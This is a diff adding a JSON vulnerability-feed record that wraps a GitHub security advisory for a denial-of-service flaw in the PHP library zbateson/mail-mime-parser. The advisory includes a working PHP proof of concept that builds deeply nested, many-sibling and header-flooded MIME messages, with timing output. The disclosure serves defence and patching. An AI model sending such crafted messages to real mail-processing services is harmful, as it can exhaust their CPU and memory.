@@ -1,0 +1,60 @@
+{
+  "ai": {
+    "affected_assets": [],
+    "evidence_urls": [],
+    "exposure_conditions": [],
+    "recommended_actions": [],
+    "status": "pending",
+    "uncertainties": []
+  },
+  "body_excerpt": "{\"credits\": [], \"cve_id\": \"CVE-2026-61816\", \"cvss\": {\"score\": 7.5, \"vector_string\": \"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H\"}, \"cvss_severities\": {\"cvss_v3\": {\"score\": 7.5, \"vector_string\": \"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H\"}, \"cvss_v4\": {\"score\": 0.0, \"vector_string\": null}}, \"cwes\": [{\"cwe_id\": \"CWE-400\", \"name\": \"Uncontrolled Resource Consumption\"}], \"description\": \"### Impact\\n\\nAn uncontrolled resource consumption / algorithmic complexity vulnerability affecting any application that parses untrusted email with this library.\\n\\nThree independent parsing paths are super-linear in cost, so a byte-size cap on the caller side does **not** bound the work done.  A crafted message under 2 MB can consume seconds of CPU or hundreds of megabytes to multiple gigabytes of memory (leading to an out-of-memory kill), enabling denial of service. The parse is lazy, but the cost is paid on the first `getAllParts()` or content read.\\n\\n### Details\\n\\n1. **Deep multipart nesting is O(depth²).** `MimeParserService::findContentBoundary()` tests each content line against the current part and every ancestor via the recursive `ParserMimePartProxy::setEndBoundaryFound()`, so a nesting depth of D costs 1 + 2 + … + D comparisons. A ~600 KB message nested ~10,000 deep does not finish parsing in a minute.\\n2. **Many sibling parts is O(n²).** `PartChildrenContainer::add()` appends each child with `array_splice($children, count($children), 0, [$part])`, which reindexes the entire array on every call. The same container backs UUEncoded `begin` parts via `NonMimeParserService`.\\n3. **Header buffering is unbounded.** `HeaderParserService::parse()` reads header lines up to a blank line with no limit on header count or total size, so a few megabytes of header lines can hold hundreds of megabytes resident; a ~5 MB message of headers can reach multiple gigabytes and be OOM-killed.\\n\\n### Proof of concept\\n\\n```php\\ncomposer require zbateson/mail-mime-parser\\n\\n<?php\\nrequire 'vendor/autoload.php';\\nuse ZBateson\\\\MailMimeParser\\\\MailMimeParser;\\n\\nfunction nestedMessage(int $depth): string {\\n    $head = ''; $tail = '';\\n    for ($i = 0; $i < $depth; $i++) {\\n        $head .= \\\"Content-Type: multipart/mixed; boundary=b$i\\\\r\\\\n\\\\r\\\\n--b$i\\\\r\\\\n\\\";\\n    }   \\n    return $head . \\\"Content-Type: text/plain\\\\r\\\\n\\\\r\\\\nx\\\\r\\\\n\\\" . $tail;\\n}\\nfunction siblingMessage(int $n): string {\\n    return \\\"Content-Type: multipart/mixed; boundary=b\\\\r\\\\n\\\\r\\\\n\\\"\\n        . str_repeat(\\\"--b\\\\r\\\\nContent-Type: text/plain\\\\r\\\\n\\\\r\\\\nx\\\\r\\\\n\\\", $n) . \\\"--b--\\\\r\\\\n\\\";\\n}\\nfunction headerMessage(int $n): string {\\n    return \\\"From: a@b\\\\r\\\\n\\\" . str_repeat(\\\"X-H: v\\\\r\\\\n\\\", $n) . \\\"\\\\r\\\\nbody\\\\r\\\\n\\\";\\n}\\nfunction measure(string $label, string $raw): void {\\n    $t = microtime(true);\\n    count((new MailMimeParser())->parse($raw, false)->getAllParts());\\n    printf(\\\"%-22s input=%5.2f MB  time=%6.2f s  peak=%6.1f MB\\\\n\\\",\\n        $label, strlen($raw) / 1048576, microtime(true) - $t,\\n        memory_get_peak_usage(true) / 1048576);\\n}\\n\\nmeasure('nesting depth=2000', nestedMessage(2000));\\nmeasure('siblings=50000',     siblingMessage(50000));\\nmeasure('headers=300000',     headerMessage(300000));\\n```\\n\\nRun with a raised memory limit so the header case does not abort early:\\n\\nphp -d memory_limit=2048M poc.php\\n// nesting depth=2000   input= 0.13 MB  time=  2.08 s  peak=  30.0 MB\\n// siblings=50000       input= 1.72 MB  time=  5.11 s  peak= 276.0 MB\\n// headers=300000       input= 2.29 MB  time=  0.40 s  peak= 380.3 MB\\n\\n### Patches   \\n\\nFixed in 4.0.2 and 3.0.6. The fixes add configurable limits on multipart nesting depth and on header count / total header size (recording a parse error past the threshold rather than throwing), and change sibling append to O(n). Users should upgrade to one of these (or later) versions.\\n\\nVersions 2.x are also affected but are end-of-life and will not receive patches; users on those lines should upgrade to a fixed release. (Versions prior to 2.0 used a different parser and are not affected by all three paths.)\\n\\n### Workarounds\\n\\nThese costs are super-linear, so an input byte-size cap alone does not bound them. Until upgrading, restrict exposure of the parser to untrusted input, and run parsing under a constrained memory_limit and execution time limit so a malicious message fails its own request rather than exhausting the host.\\n\\n\\n- Found and reported privately by Ilia Alshanetsky (@iliaal), who also proposed fixes that informed the patches.\", \"ghsa_id\": \"GHSA-f6v3-2qmr-vfjx\", \"github_reviewed_at\": \"2026-09-24T19:45:05Z\", \"html_url\": \"https://github.com/advisories/GHSA-f6v3-2qmr-vfjx\", \"identifiers\": [{\"type\": \"GHSA\", \"value\": \"GHSA-f6v3-2qmr-vfjx\"}, {\"type\": \"CVE\", \"value\": \"CVE-2026-61816\"}], \"nvd_published_at\": \"2026-09-24T18:17:17Z\", \"published_at\": \"2026-09-24T19:45:05Z\", \"references\": [\"https://github.com/zbateson/mail-mime-parser/security/advisories/GHSA-f6v3-2qmr-vfjx\", \"https://nvd.nist.gov/vuln/detail/CVE-2026-61816\", \"https://github.com/zbateson/mail-mime-parser/commit/1691e695821f70461f9554e9bb71be2859404a24\", \"https://github.com/zbateson/mail-mime-parser/commit/fa44823ba9dd651e0eecec7aa45ac8c8e6afcb78\", \"https://github.com/zbateson/mail-mime-parser/releases/tag/3.0.7\", \"https://github.com/zbateson/mail-mime-parser/releases/tag/4.0.2\", \"https://github.com/advisories/GHSA-f6v3-2qmr-vfjx\"], \"repository_advisory_url\": \"https://api.github.com/repos/zbateson/mail-mime-parser/security-advisories/GHSA-f6v3-2qmr-vfjx\", \"severity\": \"high\", \"source_code_location\": \"https://github.com/zbateson/mail-mime-parser\", \"summary\": \"zbateson/mail-mime-parser has uncontrolled resource consumption (CPU/memory DoS) parsing untrusted MIME\", \"type\": \"reviewed\", \"updated_at\": \"2026-09-24T19:45:08Z\", \"url\": \"https://api.github.com/advisories/GHSA-f6v3-2qmr-vfjx\", \"vulnerabilities\": [{\"first_patched_version\": \"3.0.6\", \"package\": {\"ecosystem\": \"composer\", \"name\": \"zbateson/mail-mime-parser\"}, \"vulnerable_functions\": [], \"vulnerable_version_range\": \">= 2.0.0, < 3.0.6\"}, {\"first_patched_version\": \"4.0.2\", \"package\": {\"ecosystem\": \"composer\", \"name\": \"zbateson/mail-mime-parser\"}, \"vulnerable_functions\": [], \"vulnerable_version_range\": \">= 4.0.0, < 4.0.2\"}], \"withdrawn_at\": null}",
+  "canonical_id": "github:ghsa-f6v3-2qmr-vfjx",
+  "decision": {
+    "priority": "INFO",
+    "reasons": [
+      "資産不一致または判定情報不足"
+    ]
+  },
+  "enrichment": {
+    "asset_match": false,
+    "cisa_kev": false,
+    "internet_exposed": false,
+    "kev_entries": {},
+    "kev_ransomware": false,
+    "matched_asset_ids": []
+  },
+  "facts": {
+    "affected_versions": [
+      "zbateson/mail-mime-parser: >= 2.0.0, < 3.0.6",
+      "zbateson/mail-mime-parser: >= 4.0.0, < 4.0.2"
+    ],
+    "authentication_required": false,
+    "cves": [
+      "CVE-2026-61816"
+    ],
+    "cvss_score": 7.5,
+    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
+    "fixed_versions": [],
+    "mitigations": [],
+    "products": [
+      "zbateson/mail-mime-parser"
+    ],
+    "remote": true,
+    "vendor_severity": "high"
+  },
+  "first_seen_at": "2026-09-25T19:13:21.129655Z",
+  "provenance": {
+    "content_sha256": "b2d1e10740c4235380e3e0e463fb1ce92a514df9433274a30a766bc04b5110bd",
+    "extractor_version": "0.1.0",
+    "source_type": "json_api"
+  },
+  "published_at": "2026-09-24T19:45:05Z",
+  "schema_version": 1,
+  "source_id": "github_advisory_database",
+  "source_url": "https://github.com/advisories/GHSA-f6v3-2qmr-vfjx",
+  "status": "active",
+  "title": "zbateson/mail-mime-parser has uncontrolled resource consumption (CPU/memory DoS) parsing untrusted MIME",
+  "updated_at": "2026-09-24T19:45:08Z",
+  "vendor": "GitHub",
+  "vendor_advisory_id": "GHSA-f6v3-2qmr-vfjx"
+}
